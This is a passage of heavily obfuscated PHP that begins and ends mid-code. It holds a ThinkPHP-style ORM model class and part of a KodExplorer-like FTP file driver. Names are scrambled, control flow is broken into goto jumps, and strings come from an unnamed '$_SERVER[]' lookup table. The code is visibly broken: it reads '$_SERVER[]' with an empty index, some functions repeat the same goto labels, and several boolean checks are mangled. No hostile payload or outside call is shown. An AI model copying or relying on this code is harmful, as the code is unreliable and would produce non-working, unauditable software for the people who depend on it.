_options_filter(&$cЗ) { } protected function _parseType(&$fҼ, $Bޗȯ) { $cϭ =& $_SERVER[]; if (empty($this->options[$cϭ[269]][$cϭ[4] . $Bޗȯ])) { $CѶ = strtolower($this->fields[$cϭ[236]][$Bޗȯ]); if (!1 !== strpos($CѶ, $cϭ[270])) { } elseif (!1 === strpos($CѶ, $cϭ[271]) && !1 !== strpos($CѶ, $cϭ[272])) { $fҼ[$Bޗȯ] = intval($fҼ[$Bޗȯ]); } elseif (!1 !== strpos($CѶ, $cϭ[273]) || !1 !== strpos($CѶ, $cϭ[274])) { $fҼ[$Bޗȯ] = floatval($fҼ[$Bޗȯ]); } elseif (!1 !== strpos($CѶ, $cϭ[275])) { $fҼ[$Bޗȯ] = (bool) $fҼ[$Bޗȯ]; } } } public function find($B׎ = array()) { goto E; bě֪: $B׎ = $this->_parseOptions(); $d薣 = $this->db->select($B׎); if (!1 === $d薣) { return !1; } goto DĴ; E: $CƾǗ =& $_SERVER[]; if (is_numeric($B׎) || is_string($B׎)) { $dķ[$this->getPk()] = intval($B׎); $this->options[$CƾǗ[259]] = $dķ; } $this->options[$CƾǗ[276]] = 1; goto bě֪; DĴ: if (empty($d薣)) { return null; } $this->data = $d薣[0]; $this->_afterFind($this->data, $B׎); goto A; A: if (!empty($this->options[$CƾǗ[277]])) { return $this->returnResult($this->data, $this->options[$CƾǗ[277]]); } return $this->data; goto f˄І; f˄І: } protected function _afterFind(&$f, $Eؑ) { } protected function returnResult($D鎇, $D = '') { $F٪ =& $_SERVER[]; if ($D) { if (is_callable($D)) { return call_user_func($D, $D鎇); } switch (strtolower($D)) { case $F٪[278]: return json_encode($D鎇); case $F٪[279]: return xml_encode($D鎇); } } return $D鎇; } public function parseFieldsMap($A, $e͢ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Bȡ => $cıʑ) { if ($e͢ == 1) { if (isset($A[$cıʑ])) { $A[$Bȡ] = $A[$cıʑ]; unset($A[$cıʑ]); } } else { if (isset($A[$Bȡ])) { $A[$cıʑ] = $A[$Bȡ]; unset($A[$Bȡ]); } } } } return $A; } public function setField($e򂏽ɼ, $Aӕ = '') { if (is_array($e򂏽ɼ)) { $e܄ = $e򂏽ɼ; } else { $e܄[$e򂏽ɼ] = $Aӕ; } return $this->save($e܄); } public function setAdd($f, $Dȅ = 1) { $eʭۭ =& $_SERVER[]; $dƂӞ = $f . $eʭۭ[280] . $Dȅ; if ($Dȅ < 0) { $dƂӞ = $f . $Dȅ; } return $this->setField($f, array($eʭۭ[281], $dƂӞ)); } public function getField($F, $b = null) { $a׊ =& $_SERVER[]; $fͷԪ[$a׊[257]] = $F; $fͷԪ = $this->_parseOptions($fͷԪ); $F = trim($F); if (strpos($F, $a׊[47])) { if (!isset($fͷԪ[$a׊[276]])) { $fͷԪ[$a׊[276]] = is_numeric($b) ? $b : $a׊[33]; } $D茞 = $this->db->select($fͷԪ); if (!empty($D茞)) { goto Eϻڝ; A: foreach ($D茞 as $Bͳ߆) { $Cɞژ = $Bͳ߆[$aï]; if (2 == $bǰڠ) { $aة[$Cɞژ] = $Bͳ߆[$bԌ]; } else { $aة[$Cɞژ] = is_string($b) ? implode($b, $Bͳ߆) : $Bͳ߆; } } return $aة; goto A; cՏ: $bԌ = array_shift($F); $aة = array(); $bǰڠ = count($B); goto A; Eϻڝ: $B = explode($a׊[47], $F); $F = array_keys($D茞[0]); $aï = array_shift($F); goto cՏ; A: } } else { if (!0 !== $b) { $fͷԪ[$a׊[276]] = is_numeric($b) ? $b : 1; } if ($b === $a׊[239]) { unset($fͷԪ[$a׊[276]]); } $Bͳ߆ = $this->db->select($fͷԪ); if (!empty($Bͳ߆)) { if ($b === $a׊[239]) { return reset($Bͳ߆[0]); } if (!0 !== $b && 1 == $fͷԪ[$a׊[276]]) { return reset($Bͳ߆[0]); } foreach ($Bͳ߆ as $c٭) { $Aɪ[] = $c٭[$F]; } return $Aɪ; } } return null; } public function create($cܘ = '', $dݏ = '') { goto aס; DƧ: return $cܘ; goto D; d: if ($this->autoCheckFields) { $fİ = $this->getDbFields(); foreach ($cܘ as $d͉ => $AӬ֘) { if (!in_array($d͉, $fİ)) { unset($cܘ[$d͉]); } elseif (MAGIC_QUOTES_GPC && is_string($AӬ֘)) { $cܘ[$d͉] = stripslashes($AӬ֘); } } } $this->autoOperation($cܘ, $dݏ); $this->data = $cܘ; goto DƧ; E⧉: $cܘ = $this->parseFieldsMap($cܘ, 0); $dݏ = $dݏ ? $dݏ : (!empty($cܘ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$E[257]])) { $fİ = $this->options[$E[257]]; unset($this->options[$E[257]]); } elseif ($dݏ == THINK_MODEL_INSERT && isset($this->insertFields)) { $fİ = $this->insertFields; } elseif ($dݏ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $fİ = $this->updateFields; } goto f; f: if (isset($fİ)) { if (is_string($fİ)) { $fİ = explode($E[47], $fİ); } if (think_config($E[282])) { $fİ[] = think_config($E[283]); } foreach ($cܘ as $d͉ => $AӬ֘) { if (!in_array($d͉, $fİ)) { unset($cܘ[$d͉]); } } } if (!$this->autoValidation($cܘ, $dݏ)) { return !1; } if (!$this->autoCheckToken($cܘ)) { $this->error = think_lang($E[284]); return !1; } goto d; aס: $E =& $_SERVER[]; if (empty($cܘ)) { $cܘ = $_POST; } elseif (is_object($cܘ)) { $cܘ = get_object_vars($cܘ); } if (empty($cܘ) || !is_array($cܘ)) { $this->error = think_lang($E[255]); return !1; } goto E⧉; D: } public function autoCheckToken($fۯƙ) { $b󩎤촓 =& $_SERVER[]; if (isset($this->options[$b󩎤촓[285]]) && !$this->options[$b󩎤촓[285]]) { return !0; } if (think_config($b󩎤촓[282])) { $DΦ = think_config($b󩎤촓[283]); if (!isset($fۯƙ[$DΦ]) || Session::get($DΦ)) { return !1; } list($A, $Cݓ) = explode($b󩎤촓[70], $fۯƙ[$DΦ]); if ($Cݓ && Session::get($DΦ . $b󩎤촓[91] . $A) === $Cݓ) { Session::remove($DΦ . $b󩎤촓[91] . $A); return !0; } if (think_config($b󩎤촓[286])) { Session::remove($DΦ . $b󩎤촓[91] . $A); } return !1; } return !0; } public function regex($cڍŢ, $eک) { $D㯎 =& $_SERVER[]; $eɄ = array($D㯎[287] => $D㯎[288], $D㯎[289] => $D㯎[290], $D㯎[291] => $D㯎[292], $D㯎[293] => $D㯎[294], $D㯎[295] => $D㯎[296], $D㯎[297] => $D㯎[298], $D㯎[299] => $D㯎[300], $D㯎[274] => $D㯎[301], $D㯎[302] => $D㯎[303]); if (isset($eɄ[strtolower($eک)])) { $eک = $eɄ[strtolower($eک)]; } return preg_match($eک, $cڍŢ) === 1; } private function autoOperation(&$f, $f퐞) { $Eݚ =& $_SERVER[]; if (!empty($this->options[$Eݚ[304]])) { $d㲡 = $this->options[$Eݚ[304]]; unset($this->options[$Eݚ[304]]); } elseif (!empty($this->_auto)) { $d㲡 = $this->_auto; } if (isset($d㲡)) { foreach ($d㲡 as $aܙ) { if (empty($aܙ[2])) { $aܙ[2] = THINK_MODEL_INSERT; } if ($f퐞 == $aܙ[2] || $aܙ[2] == THINK_MODEL_BOTH) { switch (trim($aܙ[3])) { case $Eݚ[305]: case $Eݚ[306]: $B = isset($aܙ[4]) ? (array) $aܙ[4] : array(); if (isset($f[$aܙ[0]])) { array_unshift($B, $f[$aܙ[0]]); } if ($Eݚ[305] == $aܙ[3]) { $f[$aܙ[0]] = call_user_func_array($aܙ[1], $B); } else { $f[$aܙ[0]] = call_user_func_array(array(&$this, $aܙ[1]), $B); } break; case $Eݚ[257]: $f[$aܙ[0]] = $f[$aܙ[1]]; break; case $Eݚ[307]: if ($Eݚ[33] === $f[$aܙ[0]]) { unset($f[$aܙ[0]]); } break; case $Eݚ[308]: default: $f[$aܙ[0]] = $aܙ[1]; } if (!1 === $f[$aܙ[0]]) { unset($f[$aܙ[0]]); } } } } return $f; } protected function autoValidation($a, $e꜄) { $A =& $_SERVER[]; if (!empty($this->options[$A[309]])) { $C = $this->options[$A[309]]; unset($this->options[$A[309]]); } elseif (!empty($this->_validate)) { $C = $this->_validate; } if (isset($C)) { if ($this->patchValidate) { $this->error = array(); } foreach ($C as $Dݐ => $dԓ) { if (empty($dԓ[5]) || $dԓ[5] == THINK_MODEL_BOTH || $dԓ[5] == $e꜄) { if (0 == strpos($dԓ[2], $A[310]) && strpos($dԓ[2], $A[311])) { $dԓ[2] = think_lang(substr($dԓ[2], 2, -1)); } $dԓ[3] = isset($dԓ[3]) ? $dԓ[3] : THINK_EXISTS_VALIDATE; $dԓ[4] = isset($dԓ[4]) ? $dԓ[4] : $A[312]; switch ($dԓ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($a, $dԓ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($A[33] != trim($a[$dԓ[0]])) { if (!1 === $this->_validationField($a, $dԓ)) { return !1; } } break; default: if (isset($a[$dԓ[0]])) { if (!1 === $this->_validationField($a, $dԓ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Eо, $A˅) { if (!1 === $this->_validationFieldItem($Eо, $A˅)) { if ($this->patchValidate) { $this->error[$A˅[0]] = $A˅[2]; } else { $this->error = $A˅[2]; return !1; } } return; } protected function _validationFieldItem($A, $d) { $e։ =& $_SERVER[]; switch (strtolower(trim($d[4]))) { case $e։[305]: case $e։[306]: $Dξ׸ = isset($d[6]) ? (array) $d[6] : array(); if (is_string($d[0]) && strpos($d[0], $e։[47])) { $d[0] = explode($e։[47], $d[0]); } if (is_array($d[0])) { foreach ($d[0] as $aㄫ) { $B[$aㄫ] = $A[$aㄫ]; } array_unshift($Dξ׸, $B); } else { array_unshift($Dξ׸, $A[$d[0]]); } if ($e։[305] == $d[4]) { return call_user_func_array($d[1], $Dξ׸); } else { return call_user_func_array(array(&$this, $d[1]), $Dξ׸); } case $e։[313]: return $A[$d[0]] == $A[$d[1]]; case $e։[314]: if (is_string($d[0]) && strpos($d[0], $e։[47])) { $d[0] = explode($e։[47], $d[0]); } $C = array(); if (is_array($d[0])) { foreach ($d[0] as $aㄫ) { $C[$aㄫ] = $A[$aㄫ]; } } else { $C[$d[0]] = $A[$d[0]]; } if (!empty($A[$this->getPk()])) { $C[$this->getPk()] = array($e։[315], $A[$this->getPk()]); } if ($this->where($C)->find()) { return !1; } return !0; default: return $this->check($A[$d[0]], $d[1], $d[4]); } } public function check($A, $a轲, $CȦ = "\x72\145\147\145\x78") { $Bڤ =& $_SERVER[]; $CȦ = strtolower(trim($CȦ)); switch ($CȦ) { case $Bڤ[7]: case $Bڤ[316]: $bӳ = is_array($a轲) ? $a轲 : explode($Bڤ[47], $a轲); return $CȦ == $Bڤ[7] ? in_array($A, $bӳ) : !in_array($A, $bӳ); case $Bڤ[317]: case $Bڤ[318]: if (is_array($a轲)) { $fӸ = $a轲[0]; $cߖ = $a轲[1]; } else { list($fӸ, $cߖ) = explode($Bڤ[47], $a轲); } return $CȦ == $Bڤ[317] ? $A >= $fӸ && $A <= $cߖ : $A < $fӸ || $A > $cߖ; case $Bڤ[319]: case $Bڤ[320]: return $CȦ == $Bڤ[319] ? $A == $a轲 : $A != $a轲; case $Bڤ[321]: $d = mb_strlen($A, $Bڤ[322]); if (strpos($a轲, $Bڤ[47])) { list($fӸ, $cߖ) = explode($Bڤ[47], $a轲); return $d >= $fӸ && $d <= $cߖ; } else { return $d == $a轲; } case $Bڤ[323]: list($fԶ, $Cι) = explode($Bڤ[47], $a轲); if (!is_numeric($fԶ)) { $fԶ = strtotime($fԶ); } if (!is_numeric($Cι)) { $Cι = strtotime($Cι); } return NOW_TIME >= $fԶ && NOW_TIME <= $Cι; case $Bڤ[324]: return in_array(get_client_ip(), explode($Bڤ[47], $a轲)); case $Bڤ[325]: return !in_array(get_client_ip(), explode($Bڤ[47], $a轲)); case $Bڤ[312]: default: return $this->regex($A, $a轲); } } public function query($c񍩼, $C = false) { $cԻ =& $_SERVER[]; if (!is_bool($C) && !is_array($C)) { $C = func_get_args(); array_shift($C); } $c񍩼 = str_replace(array($cԻ[213], $cԻ[326]), $cԻ[50], $c񍩼); $c񍩼 = $this->parseSql($c񍩼, $C); return $this->db->query($c񍩼); } public function execute($Dԧݠ, $F۟ = false) { if (!is_bool($F۟) && !is_array($F۟)) { $F۟ = func_get_args(); array_shift($F۟); } $Dԧݠ = $this->parseSql($Dԧݠ, $F۟); return $this->db->execute($Dԧݠ); } protected function parseSql($Bۓ, $C) { $e߂ =& $_SERVER[]; if (!0 === $C) { $cᱺ = $this->_parseOptions(); $Bۓ = $this->db->parseSql($Bۓ, $cᱺ); } elseif (is_array($C)) { $C = array_map(array($this->db, $e߂[327]), $C); $Bۓ = vsprintf($Bۓ, $C); } else { $Bۓ = strtr($Bۓ, array($e߂[328] => $this->getTableName(), $e߂[329] => think_config($e߂[228]))); } $this->db->setModel($this->name); return $Bۓ; } public function db($B = '', $AĔ = '', $Bޞ = array()) { goto cީ; B󝯟: static $e = array(); if (!isset($e[$B]) || isset($e[$B]) && $AĔ && $F[$B] != $AĔ) { if (!empty($AĔ) && is_string($AĔ) && !1 === strpos($AĔ, $fƓ[8])) { $AĔ = think_config($AĔ); } $e[$B] = Db::getInstance($AĔ); } elseif (NULL === $AĔ) { $e[$B]->close(); unset($e[$B]); return; } if (!empty($Bޞ)) { if (is_string($Bޞ)) { parse_str($Bޞ, $Bޞ); } foreach ($Bޞ as $aݐ => $F爉) { $this->setProperty($aݐ, $F爉); } } goto A싳׮; aت۶: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto fר; A싳׮: $F[$B] = $AĔ; $this->db = $e[$B]; $this->_after_db(); goto aت۶; cީ: $fƓ =& $_SERVER[]; if ($fƓ[33] === $B && $this->db) { return $this->db; } static $F = array(); goto B󝯟; fר: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D˜Ͱ = get_class($this); if ($D˜Ͱ == $_SERVER[][330]) { return $this->name; } $this->name = substr($D˜Ͱ, 0, -5); } return $this->name; } public function getTableName() { $F =& $_SERVER[]; if (empty($this->trueTableName)) { $Eܖ = !empty($this->tablePrefix) ? $this->tablePrefix : $F[33]; if (!empty($this->tableName)) { $Eܖ .= $this->tableName; } else { $Eܖ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Eܖ); } return (!empty($this->dbName) ? $this->dbName . $F[91] : $F[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $cߟֈ =& $_SERVER[]; return isset($this->fields[$cߟֈ[235]]) ? $this->fields[$cߟֈ[235]] : $this->pk; } public function getDbFields() { $eԳ =& $_SERVER[]; if (isset($this->options[$eԳ[263]])) { $DǓێ = $this->db->getFields($this->options[$eԳ[263]]); return $DǓێ ? array_keys($DǓێ) : !1; } if ($this->fields) { $DǓێ = $this->fields; unset($DǓێ[$eԳ[234]], $DǓێ[$eԳ[235]], $DǓێ[$eԳ[236]], $DǓێ[$eԳ[233]]); return $DǓێ; } return !1; } public function data($c٨ = '') { $dճ֕ =& $_SERVER[]; if ($dճ֕[33] === $c٨ && !empty($this->data)) { return $this->data; } if (is_object($c٨)) { $c٨ = get_object_vars($c٨); } elseif (is_string($c٨)) { parse_str($c٨, $c٨); } elseif (!is_array($c٨)) { think_exception(think_lang($dճ֕[255])); } $this->data = $c٨; return $this; } public function join($D靓𑇅) { $Dѩ =& $_SERVER[]; if (is_array($D靓𑇅)) { $this->options[$Dѩ[266]] = $D靓𑇅; } elseif (!empty($D靓𑇅)) { $this->options[$Dѩ[266]][] = $D靓𑇅; } return $this; } public function union($Aߍ҄, $FП = false) { goto b; A얝: if (is_object($Aߍ҄)) { $Aߍ҄ = get_object_vars($Aߍ҄); } if (is_string($Aߍ҄)) { $F = $Aߍ҄; } elseif (is_array($Aߍ҄)) { if (isset($Aߍ҄[0])) { $this->options[$D[331]] = array_merge($this->options[$D[331]], $Aߍ҄); return $this; } else { $F = $Aߍ҄; } } else { think_exception(think_lang($D[255])); } $this->options[$D[331]][] = $F; goto eК; eК: return $this; goto a; b: $D =& $_SERVER[]; if (empty($Aߍ҄)) { return $this; } if ($FП) { $this->options[$D[331]][$D[332]] = !0; } goto A얝; a: } public function cache($Fφ = true, $Dо = null, $c = '') { $d盦 =& $_SERVER[]; if (!1 !== $Fφ) { $this->options[$d盦[333]] = array($d盦[89] => $Fφ, $d盦[323] => $Dо, $d盦[29] => $c); } return $this; } public function field($Dی, $Cო = false) { $f؏ =& $_SERVER[]; if (!0 === $Dی) { $b󬝐 = $this->getDbFields(); $Dی = $b󬝐 ? $b󬝐 : $f؏[172]; } elseif ($Cო) { if (is_string($Dی)) { $Dی = explode($f؏[47], $Dی); } $b󬝐 = $this->getDbFields(); $Dی = $b󬝐 ? array_diff($b󬝐, $Dی) : $Dی; } $this->options[$f؏[257]] = $Dی; return $this; } public function scope($AԦ = '', $c = NULL) { $cԱ =& $_SERVER[]; if ($cԱ[33] === $AԦ) { if (isset($this->_scope[$cԱ[34]])) { $e = $this->_scope[$cԱ[34]]; } else { return $this; } } elseif (is_string($AԦ)) { $DǺ = explode($cԱ[47], $AԦ); $e = array(); foreach ($DǺ as $a㋆ȹ) { if (!isset($this->_scope[$a㋆ȹ])) { continue; } $e = array_merge($e, $this->_scope[$a㋆ȹ]); } if (!empty($c) && is_array($c)) { $e = array_merge($e, $c); } } elseif (is_array($AԦ)) { $e = $AԦ; } if (is_array($e) && !empty($e)) { $this->options = array_merge($this->options, array_change_key_case($e)); } return $this; } public function where($E, $fǡ = null) { $F܆ =& $_SERVER[]; if (!is_null($fǡ) && is_string($E)) { if (!is_array($fǡ)) { $fǡ = func_get_args(); array_shift($fǡ); } $fǡ = array_map(array($this->db, $F܆[327]), $fǡ); $E = vsprintf($E, $fǡ); } elseif (is_object($E)) { $E = get_object_vars($E); } elseif (is_array($E)) { foreach ($E as $c̝ɟ => $Eھ㜞) { if ((is_numeric($c̝ɟ) || !$c̝ɟ) && is_string($Eھ㜞)) { think_trace($F܆[334], $F܆[33], $F܆[46]); die; } } } if (is_string($E) && $F܆[33] != $E) { $A˖ = array(); $A˖[$F܆[335]] = $E; $E = $A˖; } if (isset($this->options[$F܆[259]])) { $this->options[$F܆[259]] = array_merge($this->options[$F܆[259]], $E); } else { $this->options[$F܆[259]] = $E; } return $this; } public function limit($Bر, $c但 = null) { $b =& $_SERVER[]; $this->options[$b[276]] = is_null($c但) ? $Bر : $Bر . $b[47] . $c但; return $this; } public function page($c, $eᅥ = null) { $EΤ =& $_SERVER[]; $this->options[$EΤ[336]] = is_null($eᅥ) ? $c : $c . $EΤ[47] . $eᅥ; return $this; } public function comment($d) { $this->options[$_SERVER[][337]] = $d; return $this; } public function setProperty($A˹, $Aǔݷ) { if (property_exists($this, $A˹)) { $this->{$A˹} = $Aǔݷ; } return $this; } } goto Eǻ; Eą͍݉: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($F최˳) { parent::__construct(); if (count($F최˳) > 0) { $this->_init($F최˳); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($D׉) { $d铻 =& $_SERVER[]; global $config; $this->appCharset = $config[$d铻[1131]]; $this->systemCharset = $config[$d铻[1132]]; if (isset($D׉[$d铻[1133]]) && $D׉[$d铻[1133]]) { $this->systemCharset = $D׉[$d铻[1133]]; } } public function iconvApp($Cӗ) { return $this->iconvTo($Cӗ, $this->systemCharset, $this->appCharset); } public function iconvSystem($Eħ) { return $this->iconvTo($Eħ, $this->appCharset, $this->systemCharset); } public function getPathOuter($aƷɖ) { goto eĖ; F󆋒: $aƷɖ = KodIO::clear($aƷɖ); $aƷɖ = substr($aƷɖ, strlen($Bǎ)); if (empty($this->pathDriver)) { return $aƷɖ; } goto A陜؋; eĖ: $F =& $_SERVER[]; $Bǎ = $this->iconvApp($this->pathBase); $aƷɖ = $this->iconvApp($aƷɖ); goto EӋ; EӋ: if (substr($Bǎ, 0, 2) == $F[1134]) { $Bǎ = BASIC_PATH . substr($Bǎ, 2); } if (substr($aƷɖ, 0, 2) == $F[1134]) { $aƷɖ = BASIC_PATH . substr($aƷɖ, 2); } $Bǎ = KodIO::clear($Bǎ); goto F󆋒; A陜؋: return $this->pathDriver . $F[8] . ltrim($aƷɖ, $F[8]); goto c; c: } private function _init($B = array()) { goto d; d: $f =& $_SERVER[]; if (!function_exists($f[1135])) { show_json(LNG($f[1136]), !1); } $this->charsetReset($B); goto EÎ; EÎ: foreach ($B as $fݡ => $bҮ) { if (isset($this->{$fݡ})) { $this->{$fݡ} = $bҮ; } } static $CҔ = array(); $Aք = md5(json_encode($B)); goto D峤Ȱ; A: return $Bܹ; goto e˹; F¡: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $CҔ[$Aք] = array($f[1140] => $this->connect, $f[165] => $this->host, $f[164] => $this->scheme, $f[166] => $this->port); goto A; D峤Ȱ: if (isset($CҔ[$Aք])) { foreach ($CҔ[$Aք] as $fݡ => $bҮ) { $this->{$fݡ} = $bҮ; } return !0; } $a = parse_url(trim($this->server, $f[8])); $this->host = $a[$f[165]]; goto B; E: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $Bܹ = @ftp_login($this->connect, $this->username, $this->userpass); goto F¡; B: $Eچ = isset($a[$f[164]]) && $a[$f[164]] == $f[1137] ? !0 : !1; $this->scheme = $Eچ ? $f[1138] : $f[1139]; $this->port = isset($a[$f[166]]) ? $a[$f[166]] : 21; goto E; e˹: } private function _isconn() { return is_resource($this->connect); } public function mkfile($e, $C = '', $f앹 = REPEAT_RENAME) { if ($this->setContent($e, $C)) { return $this->getPathOuter($e); } return !1; } public function mkdir($D, $Aօ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $D = $this->iconvSystem($D); if ($this->isFolder($D) || @ftp_mkdir($this->connect, $D)) { return $this->getPathOuter($D); } if (!$this->mkdir($this->pathFather($D))) { return !1; } if ($D = @ftp_mkdir($this->connect, $D)) { return $this->getPathOuter($D); } return !1; } public function copyFile($cϛǡ, $d۠) { goto a; dېȅ: $E֝ = $this->iconvApp($bט); $this->download($cϛǡ, $E֝); $c = $this->upload($d۠, $E֝); goto A덄; a: if (!$this->_isconn()) { return !1; } $aۅ = $this->pathThis($this->iconvSystem($cϛǡ)); $bט = $this->tempFile($aۅ); goto dېȅ; A덄: $this->tempFileRemve($bט); return $c; goto B͞; B͞: } public function moveFile($eݼ, $E𛬔) { if (!$this->_isconn()) { return !1; } $eݼ = $this->iconvSystem($eݼ); $E𛬔 = $this->iconvSystem($E𛬔); $dēއ = @ftp_rename($this->connect, $eݼ, $E𛬔); return $dēއ ? $this->getPathOuter($E𛬔) : !1; } public function delFile($Bҝ) { if (!$this->_isconn()) { return !1; } $Bҝ = $this->iconvSystem($Bҝ); return @ftp_delete($this->connect, $Bҝ); } public function delFolder($dȐ) { if (!$this->_isconn()) { return !1; } $dȐ = $this->iconvSystem($dȐ); $B٢ = $this->ftpList($dȐ); if (!$B٢) { return @ftp_rmdir($this->connect, $dȐ); } foreach ($B٢ as $D) { if ($this->isFolder($D)) { $D = $this->iconvApp($D); $this->delFolder($D); } else { @ftp_delete($this->connect, $D); } } return @ftp_rmdir($this->connect, $dȐ); } public function rename($Cۃ, $C̡Ǻ) { goto AŃ; EЅⰘ: $d = rtrim($B︬, $b[8]) . $b[8] . $Bɿ; $FѼ륑 = @ftp_rename($this->connect, $Cۃ, $d); $d = $this->iconvApp($d); goto C; AŃ: $b =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $Bɿ = $this->fileNameAuto($this->pathFather($Cۃ), $C̡Ǻ); goto Eϑ; Eϑ: $Bɿ = $this->iconvSystem($Bɿ); $Cۃ = $this->iconvSystem($Cۃ); $B︬ = $this->pathFather($Cۃ); goto EЅⰘ; C: return $FѼ륑 ? $this->getPathOuter($d) : !1; goto a㒞; a㒞: } private function folderInfo($aģū, $b = false) { goto Aȶꐏ; c: $e؃뤨Ū = $this->iconvSystem($aģū); if ($b) { return array($C[28] => $A, $C[75] => $d, $C[29] => $C[76]); } $E = array($C[28] => $A, $C[75] => $d, $C[29] => $C[76], $C[183] => 0, $C[106] => 0, $C[1141] => !0, $C[1142] => !0); goto c; Aȶꐏ: $C =& $_SERVER[]; $d = $this->getPathOuter(rtrim($aģū, $C[8])); $A = $this->pathThis($d); goto c; c: return $E; goto B; B: } private function fileInfo($dŜ, $a = false) { goto F⢉; F⢉: $Eٛ =& $_SERVER[]; $cن = $this->getPathOuter(rtrim($dŜ, $Eٛ[8])); $f = $this->pathThis($cن); goto BĈ; d: $C߲[$Eٛ[106]] = $C߲[$Eٛ[106]] > 0 ? $C߲[$Eٛ[106]] : 0; return $C߲; goto fۦư; BĈ: $a = $this->iconvSystem($dŜ); if ($a) { return array($Eٛ[28] => $f, $Eٛ[75] => $cن, $Eٛ[29] => $Eٛ[163], $Eٛ[156] => $this->ext($dŜ), $Eٛ[77] => $this->size($dŜ)); } $C߲ = array($Eٛ[28] => $f, $Eٛ[75] => $cن, $Eٛ[29] => $Eٛ[163], $Eٛ[183] => 0, $Eٛ[106] => @ftp_mdtm($this->connect, $a), $Eٛ[156] => $this->ext($dŜ), $Eٛ[77] => $this->size($dŜ), $Eٛ[1141] => !0, $Eٛ[1142] => !0); goto d; fۦư: } public function size($Fߴ) { $Fǵ = $this->objectMeta($Fߴ); return $Fǵ ? $Fǵ[$_SERVER[][77]] : 0; } public function info($C) { if ($this->isFile($C)) { return $this->fileInfo($C, 0); } else { if ($this->isFolder($C)) { return $this->folderInfo($C); } } return !1; } public function exist($A鷣) { return $this->objectMeta($A鷣) ? !0 : !1; } public function isFile($BϮ) { $bݢ =& $_SERVER[]; $EĲ = $this->objectMeta($BϮ); return $EĲ ? $EĲ[$bݢ[29]] == $bݢ[163] : !1; } public function isFolder($Eڒ֪) { $b =& $_SERVER[]; $BŚ = $this->objectMeta($Eڒ֪); return $BŚ ? $BŚ[$b[29]] == $b[76] : !1; } public function listPath($a͖, $Fυ = false) { goto e; cłڋ: $f̐ = $this->ftpList($a͖); $e = array($C[74] => array(), $C[73] => array()); if (!$f̐) { return $e; } goto aĖӇ; e: $C =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $a͖ = $this->iconvSystem($a͖); goto cłڋ; aĖӇ: foreach ($f̐ as $a͖) { if ($this->isFolder($a͖)) { $e[$C[74]][] = $this->folderInfo($a͖, $Fυ); } else { $e[$C[73]][] = $this->fileInfo($a͖, $Fυ); } } return $e; goto aߙ; aߙ: } public function has($aǍσ, $B = false, $a = true) { goto e۬; e۬: $aɊ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $aǍσ = $this->iconvSystem($aǍσ); goto f; d∺: foreach ($A as $aǍσ) { if ($a) { if (!$this->isFolder($aǍσ)) { return !0; } } else { if ($this->isFolder($aǍσ)) { return !0; } } } return !1; goto a֌; f: $A = $this->ftpList($aǍσ); if (!$A) { return !1; } if ($B) { return array($aɊ[187] => 0, $aɊ[188] => count($A)); } goto d∺; a֌: } public function listAll($D̵) { goto b; b: $BƳ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $D̵ = $this->iconvSystem($D̵); goto bݻ; bݻ: $Dԅ = array($BƳ[73] => array(), $BƳ[74] => array()); $this->recursionFtpFiles($D̵, $Dԅ); $C = array(); goto fŅ; fŅ: foreach ($Dԅ[$BƳ[74]] as $EޛΊ̉) { $C[] = array($BƳ[75] => $BƳ[8] . trim(str_replace($D̵, $BƳ[33], $EޛΊ̉), $BƳ[8]) . $BƳ[8], $BƳ[76] => 1, $BƳ[77] => 0); } foreach ($Dԅ[$BƳ[73]] as $Aԇ) { $C[] = array($BƳ[75] => $BƳ[8] . trim(str_replace($D̵, $BƳ[33], $Aԇ), $BƳ[8]), $BƳ[76] => 0, $BƳ[77] => $this->size($Aԇ)); } return $C; goto AҎŝ; AҎŝ: } public function getContent($Bͳ) { if (!$this->_isconn()) { return !1; } $Bͳ = $this->iconvSystem($Bͳ); return $this->fileSubstr($Bͳ); } public function setContent($f, $cЇǙ = '') { goto Fס; Fס: if (!$this->_isconn()) { return !1; } $F = $this->pathThis($this->iconvSystem($f)); $c = $this->tempFile($F); goto eѐ䋟; Eن: return $Eǡ; goto fи; eѐ䋟: file_put_contents($c, $cЇǙ); $Eǡ = $this->upload($f, $this->iconvApp($c)); $this->tempFileRemve($c); goto Eن; fи: } public function fileSubstr($E蜕, $CҚ = 0, $D = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($E蜕, $CҚ, $D); } private function ftpRequest($eĸ, $AڴҦؔ = 0, $D = false) { goto E; C͐֠: return $c; goto b»̭; E: $eĸ = $this->iconvSystem($eĸ); $Fԇ = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $F = curl_init(); goto Dҧ; fې䷟: curl_setopt($F, CURLOPT_RETURNTRANSFER, 1); $c = curl_exec($F); curl_close($F); goto C͐֠; Dҧ: curl_setopt($F, CURLOPT_URL, $Fԇ . $this->pathEncode($eĸ)); curl_setopt($F, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($D) { $A񬏡 = $AڴҦؔ + $D - 1; curl_setopt($F, 